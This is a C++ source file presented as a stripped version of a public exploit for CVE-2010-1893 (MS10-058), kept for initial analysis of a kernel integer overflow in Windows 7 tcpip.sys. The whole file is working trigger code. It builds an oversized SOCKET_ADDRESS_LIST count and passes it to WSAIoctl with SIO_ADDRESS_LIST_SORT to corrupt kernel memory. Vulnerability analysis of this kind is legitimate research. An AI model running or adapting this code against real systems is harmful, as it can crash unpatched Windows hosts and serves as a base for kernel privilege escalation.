/*
	CVE-2010-1893 MS10-058 Initial Analysis

	Exploit:	Fetiveau, Jeremy. "MS10-058.cpp." 3 Mar. 2014. Web. <https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp>.

	Desc:		Stripped Jeremy's exploit for initial analysis
	OS:			Microsoft Windows 7 Ultimate 
	Component:	tcpip.sys (6.1.7600.16385)
	IDE:		Microsoft Visual Studio 2010

	Note:		Link Ws2_32.lib (Properties -> Linker -> Additional Dependencies)
*/

#include "stdafx.h"
#include "Winsock2.h"

int main(void)
{
	WSADATA wd = { 0 };
	SOCKET sock = 0;
	SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
	DWORD cb;
	CHAR buffer[0x1c];
	SOCKET_ADDRESS sa;

	memset(buffer, 0x41, 0x1c);

	buffer[0] = 0x17;
	buffer[1] = 0x00;

	sa.lpSockaddr = (LPSOCKADDR)buffer;
	sa.iSockaddrLength = 0x1c;
	pwn->iAddressCount = 0x40000003;

	memcpy(&pwn->Address[0], &sa, sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[1], &sa, sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[2], &sa, sizeof(_SOCKET_ADDRESS));
	memcpy(&pwn->Address[3], &sa, sizeof(_SOCKET_ADDRESS));

	WSAStartup(MAKEWORD(2, 0), &wd);
	sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET) {
		printf("[-] Failed to create socket (%08x)\n", WSAGetLastError());
		exit(1);
	}

	if (WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &cb, NULL, NULL)){
		printf("[+] WSAIoctl succeeded");
	} else {
		printf("[-] WSAIoctl failed");
	}

	return 0;
}

